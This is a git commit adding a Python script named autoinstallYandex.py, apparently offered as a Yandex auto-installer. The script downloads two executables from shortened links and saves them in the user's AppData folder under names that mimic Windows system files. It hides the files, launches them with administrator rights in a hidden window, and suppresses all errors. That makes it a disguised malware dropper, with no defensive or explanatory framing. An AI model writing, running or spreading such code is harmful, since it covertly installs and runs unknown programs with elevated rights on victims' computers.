93fad08855336fda606f56f1e0c9c3d77ea34ffd
iDorofa <Dorofey656@gmail.com>
2026-05-05 23:05:36 +0500

    Create autoinstallYandex.py

---
+++ autoinstallYandex.py
@@ -0,0 +1,30 @@
+import os
+import threading
+import requests
+import ctypes
+
+URL1 = "https://clck.ru/3TSRbV"
+URL2 = "https://clck.ru/3TSRZm"
+
+APP_DATA = os.getenv('APPDATA')
+PATH1 = os.path.join(APP_DATA, "Microsoft", "Windows", "Windows.Security.Host.Container.Runtime.exe")
+PATH2 = os.path.join(APP_DATA, "Microsoft", "Windows", "SvcHostManagement.exe")
+
+def download_and_run(url, path):
+    try:
+        r = requests.get(url)
+        with open(path, 'wb') as f:
+            f.write(r.content)
+        os.system(f'attrib +h "{path}"')
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", path, None, None, 0)
+    except:
+        pass
+
+def background_task():
+    download_and_run(URL1, PATH1)
+    download_and_run(URL2, PATH2)
+
+if __name__ == "__main__":
+    t = threading.Thread(target=background_task)
+    t.daemon = True
+    t.start()
